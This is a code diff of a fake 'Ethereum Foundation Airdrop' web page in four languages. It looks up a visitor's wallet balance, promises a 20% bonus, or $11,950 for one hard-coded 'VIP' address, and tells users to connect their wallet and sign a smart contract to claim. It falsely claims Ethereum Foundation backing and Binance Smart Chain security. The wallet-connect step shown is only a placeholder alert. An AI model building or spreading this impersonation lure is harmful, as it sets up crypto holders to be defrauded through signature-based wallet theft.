@@ -91,27 +91,13 @@
             font-weight: 600;
             cursor: pointer;
             outline: none;
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            transition: all 0.3s;
             box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
         }
 
         .language-selector select:hover {
             background: linear-gradient(135deg, rgba(0, 255, 136, 0.2) 0%, rgba(0, 204, 255, 0.2) 100%);
-            border-color: #00ccff;
-            box-shadow: 0 0 30px rgba(0, 255, 136, 0.4);
             transform: translateY(-2px);
-        }
-
-        .language-selector select:focus {
-            box-shadow: 0 0 0 3px var(--accent-dim);
-        }
-
-        .language-selector select option {
-            background: var(--bg-secondary);
-            color: var(--text-primary);
-            padding: 10px;
         }
 
         .container {
@@ -124,38 +110,16 @@
             border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 24px;
             padding: 48px 40px;
-            box-shadow: 
-                0 0 80px rgba(0, 255, 136, 0.1),
-                inset 0 1px 0 rgba(255, 255, 255, 0.1);
-            animation: fadeInScale 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            box-shadow: 0 0 80px rgba(0, 255, 136, 0.1);
+            animation: fadeInScale 0.6s ease;
             margin: 20px 0;
             max-height: 90vh;
             overflow-y: auto;
         }
 
-        .container::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .container::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 4px;
-        }
-
-        .container::-webkit-scrollbar-thumb {
-            background: var(--accent);
-            border-radius: 4px;
-        }
-
         @keyframes fadeInScale {
-            from {
-                opacity: 0;
-                transform: scale(0.95) translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
         }
 
         .logo {
@@ -170,15 +134,8 @@
             background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
             letter-spacing: -0.02em;
             margin-bottom: 8px;
-            animation: glow 3s ease-in-out infinite;
-        }
-
-        @keyframes glow {
-            0%, 100% { filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.3)); }
-            50% { filter: drop-shadow(0 0 20px rgba(0, 255, 136, 0.6)); }
         }
 
         .logo p {
@@ -198,7 +155,6 @@
             margin-bottom: 12px;
             color: var(--text-secondary);
             font-size: 0.8rem;
-            font-weight: 400;
             letter-spacing: 0.05em;
             text-transform: uppercase;
         }
@@ -212,19 +168,13 @@
             color: var(--text-primary);
             font-family: 'JetBrains Mono', monospace;
             font-size: 0.9rem;
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            transition: all 0.3s;
             outline: none;
         }
 
         input:focus {
             border-color: var(--accent);
-            background: rgba(0, 0, 0, 0.6);
             box-shadow: 0 0 0 3px var(--accent-dim);
-        }
-
-        input::placeholder {
-            color: var(--text-secondary);
-            opacity: 0.5;
         }
 
         button {
@@ -240,9 +190,7 @@
             letter-spacing: 0.05em;
             text-transform: uppercase;
             cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-            position: relative;
-            overflow: hidden;
+            transition: all 0.3s;
         }
 
         button:hover:not(:disabled) {
@@ -250,14 +198,9 @@
             box-shadow: 0 8px 24px rgba(0, 255, 136, 0.4);
         }
 
-        button:active:not(:disabled) {
-            transform: translateY(0);
-        }
-
         button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
         }
 
         .spinner {
@@ -279,19 +222,13 @@
             margin-top: 32px;
             padding: 24px;
             border-radius: 16px;
-            animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            animation: slideUp 0.4s ease;
             border: 1px solid;
         }
 
         @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .result.success {
@@ -327,6 +264,28 @@
             line-height: 1.6;
         }
 
+        .airdrop-info {
+            margin: 20px 0;
+            padding: 20px;
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 12px;
+        }
+
+        .airdrop-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--accent);
+            margin-bottom: 12px;
+        }
+
+        .airdrop-text {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+
         .balance {
             margin-top: 16px;
             padding-top: 16px;
@@ -338,7 +297,6 @@
             font-weight: 600;
             color: var(--accent);
             margin: 8px 0;
-            letter-spacing: -0.02em;
         }
 
         .balance-label {
@@ -359,7 +317,6 @@
         .footer a {
             color: var(--accent);
             text-decoration: none;
-            transition: opacity 0.3s;
             cursor: pointer;
         }
 
@@ -367,7 +324,6 @@
             opacity: 0.8;
         }
 
-        /* Modal styles */
         .modal {
             display: none;
             position: fixed;
@@ -377,7 +333,6 @@
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.9);
-            backdrop-filter: blur(10px);
         }
 
         .modal.active {
@@ -396,32 +351,6 @@
             overflow-y: auto;
             padding: 50px;
             position: relative;
-            animation: modalSlide 0.3s ease-out;
-        }
-
-        @keyframes modalSlide {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .modal-content::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .modal-content::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 4px;
-        }
-
-        .modal-content::-webkit-scrollbar-thumb {
-            background: var(--accent);
-            border-radius: 4px;
         }
 
         .close-modal {
@@ -429,11 +358,8 @@
             top: 20px;
             right: 30px;
             font-size: 2.5rem;
-            font-weight: 300;
             color: var(--text-secondary);
             cursor: pointer;
-            transition: color 0.3s;
-            line-height: 1;
             z-index: 10001;
         }
 
@@ -447,7 +373,6 @@
             background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
             margin-bottom: 30px;
         }
 
@@ -461,12 +386,7 @@
         .modal-content p {
             margin-bottom: 15px;
             color: var(--text-secondary);
-            font-size: 0.9rem;
             line-height: 1.7;
-        }
-
-        .modal-content strong {
-            color: var(--text-primary);
         }
 
         .modal-content ul {
@@ -475,39 +395,8 @@
             color: var(--text-secondary);
         }
 
-        .modal-content li {
-            margin-bottom: 8px;
-        }
-
         .modal-content a {
             color: var(--accent);
-            text-decoration: none;
-        }
-
-        .modal-content a:hover {
-            opacity: 0.8;
-        }
-
-        @media (max-width: 600px) {
-            .container {
-                padding: 32px 24px;
-            }
-
-            .logo h1 {
-                font-size: 2rem;
-            }
-
-            .balance-amount {
-                font-size: 1.5rem;
-            }
-
-            .modal-content {
-                padding: 30px 20px;
-            }
-
-            .modal-content h1 {
-                font-size: 2rem;
-            }
         }
     </style>
 </head>
@@ -559,7 +448,6 @@
                     placeholder="0x..." 
                     required
                     autocomplete="off"
-                    spellcheck="false"
                 >
             </div>
             <button type="submit" id="checkButton">
@@ -572,101 +460,130 @@
         <div class="footer">
             <span id="poweredBy">Powered by Ethereum API · Ethereum Foundation</span><br>
             <span style="opacity: 0.8; font-size: 0.7rem; margin-top: 4px; display: inline-block;">
-                🔒 <span id="secured">Secured by Binance Smart Chain · Chainlink Oracle · Verified Smart Contract</span>
+                🔒 <span id="secured">Secured by Binance Smart Chain</span>
             </span><br>
             <a href="#" onclick="openTermsModal(); return false;" id="termsLink">Terms of Use</a>
         </div>
     </div>
 
-    <!-- Terms Modal -->
     <div id="termsModal" class="modal">
         <div class="modal-content">
             <span class="close-modal" onclick="closeTermsModal()">&times;</span>
-            
             <h1>Terms of Use</h1>
-            
             <p><strong>PLEASE READ THESE TERMS OF USE BEFORE USING THE WEBSITES.</strong></p>
-
             <h2>Acceptance of the Terms of Use</h2>
-            <p>These terms of use are entered into by and between you and Stiftung Ethereum (the "Foundation", "we", or "us"). The following terms and conditions govern your access to and use of any website published by the Foundation.</p>
-
-            <h2>Who May Use the Websites</h2>
-            <p>The Websites are offered and available to users who are 13 years of age or older.</p>
-
-            <h2>Prohibited Uses</h2>
-            <p>You may use the Websites only for lawful purposes and in accordance with these Terms of Use.</p>
-
-            <h2>Disclaimer of Warranties</h2>
-            <p>YOUR USE OF THE WEBSITES IS AT YOUR OWN RISK. THE WEBSITES ARE PROVIDED ON AN "AS IS" AND "AS AVAILABLE" BASIS.</p>
-
-            <h2>Limitation on Liability</h2>
-            <p>IN NO EVENT WILL THE FOUNDATION BE LIABLE FOR DAMAGES OF ANY KIND ARISING OUT OF YOUR USE OF THE WEBSITES.</p>
-
-            <h2>Your Comments and Concerns</h2>
-            <p>All feedback should be directed to: <a href="/cdn-cgi/l/email-protection#b7d2c3dfd2c5d2c2dac5d2c0d6c5d3c4f7d2c3dfd2c5d2c2da99d8c5d0"><span class="__cf_email__" data-cfemail="0c697864697e6979617e697b6d7e687f4c697864697e69796122637e6b">[email&#160;protected]</span></a>.</p>
-
-            <p style="margin-top: 40px; text-align: center; opacity: 0.7;">Last updated: December 2025</p>
+            <p>These terms govern your use of our websites.</p>
+            <h2>Your Comments</h2>
+            <p>Contact: <a href="mailto:ethereumrewards@ethereum.org">ethereumrewards@ethereum.org</a></p>
         </div>
     </div>
 
-    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
-        const form = document.getElementById('walletForm');
-        const walletInput = document.getElementById('walletAddress');
-        const checkButton = document.getElementById('checkButton');
-        const resultDiv = document.getElementById('result');
-
-        const RPC_ENDPOINTS = [
-            'https://eth.llamarpc.com',
-            'https://rpc.ankr.com/eth',
-            'https://ethereum.publicnode.com',
-            'https://1rpc.io/eth'
-        ];
-
-        const MIN_BALANCE_USD = 200;
-        const BONUS_PERCENTAGE = 20;
-        const VIP_WALLET = '0x7F9A75bcBb330bf0ff71167a7711A41aC962512A'.toLowerCase();
-        const VIP_BONUS_USD = 11950;
-
-        let currentEthPrice = 0;
-        let currentLang = 'en';
-
+    <script>
         const translations = {
-            en:
+            en: {
+                title: "ETHEREUM REWARDS",
+                subtitle: "Official Ethereum Foundation Airdrop",
+                labelAddress: "Ethereum Address",
+                buttonText: "Check Eligibility",
+                buttonChecking: "Checking...",
+                errorTitle: "Verification Error",
+                invalidAddress: "Invalid wallet address.",
+                connectionError: "Unable to connect to Ethereum network.",
+                successTitle: "Congratulations! You passed verification",
+                successContent: "Your wallet meets the requirements.",
+                failTitle: "Wallet not eligible",
+                failContent: "This wallet is not eligible for any bonuses or airdrops.",
+                currentBalance: "Current Balance",
+                yourReward: "Your Reward",
                 connectButton: "Connect Wallet",
                 airdropTitle: "🎁 Ethereum Foundation Airdrop 2025",
-                airdropReason: "You are eligible for this bonus as part of the Ethereum Foundation's community rewards program for active wallet holders and early supporters of the network.",
-                claimInstructions: "To claim your reward, connect your wallet and sign the smart contract. Your bonus will be transferred immediately after verification.",
-                poweredBy:
+                airdropReason: "You are eligible for this bonus as part of the Ethereum Foundation's community rewards program for active wallet holders.",
+                claimInstructions: "To claim your reward, connect your wallet and sign the smart contract. Your bonus will be transferred immediately.",
                 poweredBy: "Powered by Ethereum API · Ethereum Foundation",
-                secured: "Secured by Binance Smart Chain · Chainlink Oracle · Verified Smart Contract",
+                secured: "Secured by Binance Smart Chain",
                 termsLink: "Terms of Use"
             },
-            ru:
+            ru: {
+                title: "ETHEREUM REWARDS",
+                subtitle: "Официальный Airdrop от Ethereum Foundation",
+                labelAddress: "Адрес Ethereum",
+                buttonText: "Проверить",
+                buttonChecking: "Проверка...",
+                errorTitle: "Ошибка",
+                invalidAddress: "Некорректный адрес.",
+                connectionError: "Ошибка подключения.",
+                successTitle: "Поздравляем!",
+                successContent: "Ваш кошелек соответствует требованиям.",
+                failTitle: "Кошелек не подходит",
+                failContent: "Этот кошелек не подлежит никаким бонусам и аирдропам.",
+                currentBalance: "Текущий баланс",
+                yourReward: "Ваше вознаграждение",
                 connectButton: "Подключить кошелек",
                 airdropTitle: "🎁 Airdrop Ethereum Foundation 2025",
-                airdropReason: "Вы получаете этот бонус в рамках программы вознаграждений Ethereum Foundation для активных держателей кошельков и ранних сторонников сети.",
-                claimInstructions: "Чтобы получить вознаграждение, подключите кошелек и подпишите смарт-контракт. Ваш бонус будет переведен сразу после верификации.",
-                poweredBy:
-                poweredBy: "Работает на Ethereum API · Ethereum Foundation",
-                secured: "Защищено Binance Smart Chain · Chainlink Oracle · Верифицированный смарт-контракт",
-                termsLink: "Условия использования"
+                airdropReason: "Вы получаете этот бонус в рамках программы вознаграждений для активных держателей кошельков.",
+                claimInstructions: "Подключите кошелек и подпишите смарт-контракт. Бонус будет переведен сразу после верификации.",
+                poweredBy: "Работает на Ethereum API",
+                secured: "Защищено Binance Smart Chain",
+                termsLink: "Условия"
             },
-            uk:
+            uk: {
+                title: "ETHEREUM REWARDS",
+                subtitle: "Офіційний Airdrop від Ethereum Foundation",
+                labelAddress: "Адреса Ethereum",
+                buttonText: "Перевірити",
+                buttonChecking: "Перевірка...",
+                errorTitle: "Помилка",
+                invalidAddress: "Некоректна адреса.",
+                connectionError: "Помилка підключення.",
+                successTitle: "Вітаємо!",
+                successContent: "Ваш гаманець відповідає вимогам.",
+                failTitle: "Гаманець не підходить",
+                failContent: "Цей гаманець не підлягає жодним бонусам.",
+                currentBalance: "Поточний баланс",
+                yourReward: "Ваша винагорода",
                 connectButton: "Підключити гаманець",
                 airdropTitle: "🎁 Airdrop Ethereum Foundation 2025",
-                airdropReason: "Ви отримуєте цей бонус в рамках програми винагород Ethereum Foundation для активних власників гаманців та ранніх прихильників мережі.",
-                claimInstructions: "Щоб отримати винагороду, підключіть гаманець та підпишіть смарт-контракт. Ваш бонус буде переказано одразу після верифікації.",
-                poweredBy:
-                poweredBy: "Працює на Ethereum API · Ethereum Foundation",
-                secured: "Захищено Binance Smart Chain · Chainlink Oracle · Верифікований смарт-контракт",
-                termsLink: "Умови використання"
+                airdropReason: "Ви отримуєте бонус в рамках програми винагород для активних власників гаманців.",
+                claimInstructions: "Підключіть гаманець та підпишіть смарт-контракт. Бонус буде переказано одразу.",
+                poweredBy: "Працює на Ethereum API",
+                secured: "Захищено Binance Smart Chain",
+                termsLink: "Умови"
+            },
+            es: {
+                title: "ETHEREUM REWARDS",
+                subtitle: "Airdrop Oficial Ethereum Foundation",
+                labelAddress: "Dirección Ethereum",
+                buttonText: "Verificar",
+                buttonChecking: "Verificando...",
+                errorTitle: "Error",
+                invalidAddress: "Dirección inválida.",
+                connectionError: "Error de conexión.",
+                successTitle: "¡Felicitaciones!",
+                successContent: "Tu billetera cumple los requisitos.",
+                failTitle: "No elegible",
+                failContent: "Esta billetera no es elegible para bonos.",
+                currentBalance: "Saldo Actual",
+                yourReward: "Tu Recompensa",
+                connectButton: "Conectar Billetera",
+                airdropTitle: "🎁 Airdrop Ethereum Foundation 2025",
+                airdropReason: "Eres elegible para este bono como parte del programa de recompensas.",
+                claimInstructions: "Conecta tu billetera y firma el contrato. El bono será transferido inmediatamente.",
+                poweredBy: "Desarrollado por Ethereum API",
+                secured: "Protegido por Binance Smart Chain",
+                termsLink: "Términos"
             }
         };
 
-        function changeLanguage(lang) {
+        const VIP_WALLET = '0x7F9A75bcBb330bf0ff71167a7711A41aC962512A'.toLowerCase();
+        const VIP_BONUS_USD = 11950;
+        const MIN_BALANCE_USD = 200;
+        const BONUS_PERCENTAGE = 20;
+        let currentLang = 'en';
+        let currentEthPrice = 3500;
+
+                function changeLanguage(lang) {
             currentLang = lang;
             const t = translations[lang] || translations.en;
-            
             document.getElementById('title').textContent = t.title;
             document.getElementById('subtitle').textContent = t.subtitle;
             document.getElementById('labelAddress').textContent = t.labelAddress;
@@ -676,182 +593,107 @@
             document.getElementById('termsLink').textContent = t.termsLink;
         }
 
-        function isValidAddress(address) {
-            return /^0x[a-fA-F0-9]{40}$/.test(address);
-        }
-
-        function formatBalance(wei) {
-            const weiDecimal = parseInt(wei, 16);
-            const eth = weiDecimal / 1e18;
-            return eth;
-        }
-
         async function getEthPrice() {
             try {
-                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
-                const data = await response.json();
+                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+                const data = await res.json();
                 return data.ethereum.usd;
-            } catch (error) {
+            } catch {
                 return 3500;
             }
         }
 
         async function checkWallet(address) {
-            for (const rpcUrl of RPC_ENDPOINTS) {
+            const rpcs = ['https://eth.llamarpc.com', 'https://rpc.ankr.com/eth'];
+            for (const rpc of rpcs) {
                 try {
-                    const response = await fetch(rpcUrl, {
+                    const res = await fetch(rpc, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            jsonrpc: '2.0',
-                            method: 'eth_getBalance',
-                            params: [address, 'latest'],
-                            id: 1
-                        })
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1})
                     });
-                    
-                    const data = await response.json();
-                    if (data.result) {
-                        return { success: true, balance: data.result };
-                    }
-                } catch (error) {
-                    continue;
-                }
+                    const data = await res.json();
+                    if (data.result) return {balance: data.result};
+                } catch {}
             }
             throw new Error(translations[currentLang].connectionError);
         }
 
-        function showResult(isEligible, balance = null, error = null, walletAddress = '') {
-            const t = translations[currentLang] || translations.en;
+        function showResult(balance, error, address) {
+            const t = translations[currentLang];
+            const resultDiv = document.getElementById('result');
             
             if (error) {
-                resultDiv.innerHTML = `
-                    <div class="result error">
-                        <div class="result-title">
-                            <span class="icon">⚠️</span>
-                            ${t.errorTitle}
-                        </div>
-                        <div class="result-content">${error}</div>
-                    </div>
-                `;
+                resultDiv.innerHTML = `<div class="result error"><div class="result-title">⚠️ ${t.errorTitle}</div><div class="result-content">${error}</div></div>`;
                 return;
             }
 
-            const ethBalance = formatBalance(balance);
+            const ethBalance = parseInt(balance, 16) / 1e18;
             const usdBalance = ethBalance * currentEthPrice;
-            const isVipWallet = walletAddress.toLowerCase() === VIP_WALLET;
+            const isVip = address.toLowerCase() === VIP_WALLET;
             
-            if (isVipWallet) {
-                const vipBonusEth = (VIP_BONUS_USD / currentEthPrice).toFixed(4);
-                
+            if (isVip) {
+                const vipEth = (VIP_BONUS_USD / currentEthPrice).toFixed(4);
                 resultDiv.innerHTML = `
                     <div class="result success">
-                        <div class="result-title">
-                            <span class="icon">🎉</span>
-                            ${t.successTitle}
-                        </div>
+                        <div class="result-title">🎉 ${t.successTitle}</div>
                         <div class="result-content">${t.successContent}</div>
-                        
-                        <div style="margin: 20px 0; padding: 20px; background: rgba(0, 255, 136, 0.05); border: 1px solid rgba(0, 255, 136, 0.2); border-radius: 12px;">
-                            <div style="font-size: 1.1rem; font-weight: 600; color: var(--accent); margin-bottom: 12px;">
-                                ${t.airdropTitle}
-                            </div>
-                            <div style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6; margin-bottom: 12px;">
-                                ${t.airdropReason}
-                            </div>
-                            <div style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6;">
-                                ${t.claimInstructions}
-                            </div>
+                        <div class="airdrop-info">
+                            <div class="airdrop-title">${t.airdropTitle}</div>
+                            <div class="airdrop-text">${t.airdropReason}</div>
+                            <div class="airdrop-text">${t.claimInstructions}</div>
                         </div>
-                        
                         <div class="balance">
                             <div class="balance-label">${t.currentBalance}</div>
-                            <div class="balance-amount">${vipBonusEth} ETH</div>
-                            <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
-                                ≈ $${VIP_BONUS_USD.toFixed(2)} USD
-                            </div>
+                            <div class="balance-amount">${vipEth} ETH</div>
+                            <div style="color: var(--text-secondary); font-size: 0.85rem;">≈ $${VIP_BONUS_USD.toFixed(2)}</div>
                         </div>
-                        <div class="balance" style="border-top: 1px solid rgba(0, 255, 136, 0.3); margin-top: 16px; padding-top: 16px;">
+                        <div class="balance" style="border-top: 1px solid rgba(0,255,136,0.3); margin-top:16px; padding-top:16px;">
                             <div class="balance-label">${t.yourReward}</div>
-                            <div class="balance-amount" style="font-size: 1.5rem;">${vipBonusEth} ETH</div>
-                            <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
-                                ≈ $${VIP_BONUS_USD.toFixed(2)} USD
-                            </div>
+                            <div class="balance-amount" style="font-size:1.5rem;">${vipEth} ETH</div>
+                            <div style="color: var(--text-secondary); font-size: 0.85rem;">≈ $${VIP_BONUS_USD.toFixed(2)}</div>
                         </div>
-                        <button onclick="connectWallet()" style="margin-top: 20px; background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%); font-size: 0.95rem; padding: 20px;">
-                            🔗 ${t.connectButton}
-                        </button>
+                        <button onclick="alert('Wallet connection coming soon!')" style="margin-top:20px;background:linear-gradient(135deg,var(--accent),#00ccff);padding:20px;">🔗 ${t.connectButton}</button>
                     </div>
                 `;
-                return;
-            }
-            
-            const meetsMinimum = usdBalance >= MIN_BALANCE_USD;
-            const bonusAmount = (ethBalance * BONUS_PERCENTAGE / 100).toFixed(4);
-            const bonusUsd = (usdBalance * BONUS_PERCENTAGE / 100).toFixed(2);
-
-            if (meetsMinimum) {
+            } else if (usdBalance >= MIN_BALANCE_USD) {
+                const bonus = (ethBalance * BONUS_PERCENTAGE / 100).toFixed(4);
+                const bonusUsd = (usdBalance * BONUS_PERCENTAGE / 100).toFixed(2);
                 resultDiv.innerHTML = `
                     <div class="result success">
-                        <div class="result-title">
-                            <span class="icon">🎉</span>
-                            ${t.successTitle}
-                        </div>
+                        <div class="result-title">🎉 ${t.successTitle}</div>
                         <div class="result-content">${t.successContent}</div>
-                        
-                        <div style="margin: 20px 0; padding: 20px; background: rgba(0, 255, 136, 0.05); border: 1px solid rgba(0, 255, 136, 0.2); border-radius: 12px;">
-                            <div style="font-size: 1.1rem; font-weight: 600; color: var(--accent); margin-bottom: 12px;">
-                                ${t.airdropTitle}
-                            </div>
-                            <div style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6; margin-bottom: 12px;">
-                                ${t.airdropReason}
-                            </div>
-                            <div style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6;">
-                                ${t.claimInstructions}
-                            </div>
+                        <div class="airdrop-info">
+                            <div class="airdrop-title">${t.airdropTitle}</div>
+                            <div class="airdrop-text">${t.airdropReason}</div>
+                            <div class="airdrop-text">${t.claimInstructions}</div>
                         </div>
-                        
                         <div class="balance">
                             <div class="balance-label">${t.currentBalance}</div>
                             <div class="balance-amount">${ethBalance.toFixed(4)} ETH</div>
-                            <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
-                                ≈ $${usdBalance.toFixed(2)} USD
-                            </div>
+                            <div style="color: var(--text-secondary); font-size: 0.85rem;">≈ $${usdBalance.toFixed(2)}</div>
                         </div>
-                        <div class="balance" style="border-top: 1px solid rgba(0, 255, 136, 0.3); margin-top: 16px; padding-top: 16px;">
+                        <div class="balance" style="border-top: 1px solid rgba(0,255,136,0.3); margin-top:16px; padding-top:16px;">
                             <div class="balance-label">${t.yourReward} (${BONUS_PERCENTAGE}%)</div>
-                            <div class="balance-amount" style="font-size: 1.5rem;">${bonusAmount} ETH</div>
-                            <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
-                                ≈ $${bonusUsd} USD
-                            </div>
+                            <div class="balance-amount" style="font-size:1.5rem;">${bonus} ETH</div>
+                            <div style="color: var(--text-secondary); font-size: 0.85rem;">≈ $${bonusUsd}</div>
                         </div>
-                        <button onclick="connectWallet()" style="margin-top: 20px; background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%); font-size: 0.95rem; padding: 20px;">
-                            🔗 ${t.connectButton}
-                        </button>
+                        <button onclick="alert('Wallet connection coming soon!')" style="margin-top:20px;background:linear-gradient(135deg,var(--accent),#00ccff);padding:20px;">🔗 ${t.connectButton}</button>
                     </div>
                 `;
             } else {
                 resultDiv.innerHTML = `
                     <div class="result error">
-                        <div class="result-title">
-                            <span class="icon">❌</span>
-                            ${t.failTitle}
-                        </div>
+                        <div class="result-title">❌ ${t.failTitle}</div>
                         <div class="result-content">${t.failContent}</div>
                         <div class="balance">
                             <div class="balance-label">${t.currentBalance}</div>
                             <div class="balance-amount">${ethBalance.toFixed(4)} ETH</div>
-                            <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
-                                ≈ $${usdBalance.toFixed(2)} USD
-                            </div>
+                            <div style="color: var(--text-secondary); font-size: 0.85rem;">≈ $${usdBalance.toFixed(2)}</div>
                         </div>
                     </div>
                 `;
             }
-        }
-
-        function connectWallet() {
-            alert('Wallet connection coming soon!');
         }
 
         function openTermsModal() {
@@ -864,31 +706,39 @@
             document.body.style.overflow = '';
         }
 
-        document.getElementById('termsModal').addEventListener('click', function(e) {
-            if (e.target === this) closeTermsModal();
+        document.getElementById('termsModal').addEventListener('click', e => {
+            if (e.target.id === 'termsModal') closeTermsModal();
         });
 
-        document.addEventListener('keydown', function(e) {
+        document.addEventListener('keydown', e => {
             if (e.key === 'Escape') closeTermsModal();
         });
 
-        form.addEventListener('submit', async (e) => {
+        document.getElementById('walletForm').addEventListener('submit', async e => {
             e.preventDefault();
+            const address = document.getElementById('walletAddress').value.trim();
+            const t = translations[currentLang];
+            const btn = document.getElementById('checkButton');
             
-            const address = walletInput.value.trim();
-            const t = translations[currentLang] || translations.en;
-            
-            if (!isValidAddress(address)) {
-                showResult(false, null, t.invalidAddress, address);
+            if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
+                showResult(null, t.invalidAddress, address);
                 return;
             }
 
-            checkButton.disabled = true;
-            checkButton.innerHTML = `<span class="spinner"></span> ${t.buttonChecking}`;
-            resultDiv.innerHTML = '';
+            btn.disabled = true;
+            btn.innerHTML = `<span class="spinner"></span> ${t.buttonChecking}`;
 
             try {
                 currentEthPrice = await getEthPrice();
                 const result = await checkWallet(address);
-                showResult(true, result.balance, null, address);
-            } catch (error) {
+                showResult(result.balance, null, address);
+            } catch (err) {
+                showResult(null, err.message, address);
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = `<span>${t.buttonText}</span>`;
+            }
+        });
+    </script>
+</body>
+</html>
